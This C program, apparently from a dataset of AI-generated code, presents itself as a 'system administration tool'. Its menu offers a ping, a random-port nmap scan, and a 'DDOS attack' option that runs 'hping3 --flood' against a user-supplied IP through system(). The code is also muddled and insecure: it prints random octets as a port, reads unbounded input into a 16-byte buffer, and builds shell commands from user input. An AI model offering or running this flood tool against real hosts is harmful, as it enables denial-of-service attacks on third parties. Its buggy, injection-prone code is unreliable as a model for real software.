//FormAI DATASET v1.0 Category: System administration ; Style: post-apocalyptic
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

// Function to generate random numbers
int generateRandom(int min, int max) {
    return (rand() % (max - min + 1)) + min;
}

// Function to check if a given IP address is in a valid format
int isValidIP(char *ip) {
    int num1, num2, num3, num4;
    if (sscanf(ip, "%d.%d.%d.%d", &num1, &num2, &num3, &num4) != 4) {
        return 0;
    }
    if (num1 < 0 || num1 > 255 || num2 < 0 || num2 > 255 || num3 < 0 || num3 > 255 || num4 < 0 || num4 > 255) {
        return 0;
    }
    return 1;
}

int main() {
    // Initialize random seed
    srand(time(NULL));

    // Declare variables
    int choice, num1, num2, num3, num4, port;
    char ip[16], command[128];

    // Display menu options
    printf("Welcome to the system administration tool.\n");
    printf("Please choose an option from the following list:\n");
    printf("1. Check network status\n");
    printf("2. Scan for an open port\n");
    printf("3. Launch a DDOS attack\n");
    printf("4. Exit program\n");

    do {
        // Prompt for user choice
        printf("\nEnter your choice (1-4): ");
        scanf("%d", &choice);

        switch (choice) {
            case 1:
                printf("\nChecking network status...\n");
                system("ping -c 4 www.google.com");
                break;
            case 2:
                printf("\nEnter IP address to scan: ");
                scanf("%s", ip);

                // Check if IP address is valid
                if (!isValidIP(ip)) {
                    printf("Invalid IP address.\n");
                    break;
                }

                num1 = generateRandom(1, 255);
                num2 = generateRandom(1, 255);
                num3 = generateRandom(1, 255);
                num4 = generateRandom(1, 255);

                printf("Scanning for an open port on %s:%d.%d.%d.%d...\n", ip, num1, num2, num3, num4);

                port = generateRandom(1, 65535);
                sprintf(command, "nmap -p %d %s", port, ip);
                printf("Running command: %s\n", command);
                system(command);
                break;
            case 3:
                printf("\nEnter IP address to attack: ");
                scanf("%s", ip);

                // Check if IP address is valid
                if (!isValidIP(ip)) {
                    printf("Invalid IP address.\n");
                    break;
                }

                num1 = generateRandom(1, 255);
                num2 = generateRandom(1, 255);
                num3 = generateRandom(1, 255);
                num4 = generateRandom(1, 255);

                printf("Launching a DDOS attack on %s:%d.%d.%d.%d...\n", ip, num1, num2, num3, num4);
                printf("Warning: this action is illegal and can result in severe legal consequences.\n");

                sprintf(command, "hping3 --flood -p 80 %s", ip);
                printf("Running command: %s\n", command);
                system(command);
                break;
            case 4:
                printf("\nExiting program...\n");
                break;
            default:
                printf("\nInvalid choice. Please choose an option from the following list:\n");
                printf("1. Check network status\n");
                printf("2. Scan for an open port\n");
                printf("3. Launch a DDOS attack\n");
                printf("4. Exit program\n");
                break;
        }
    } while (choice != 4);

    return 0;
}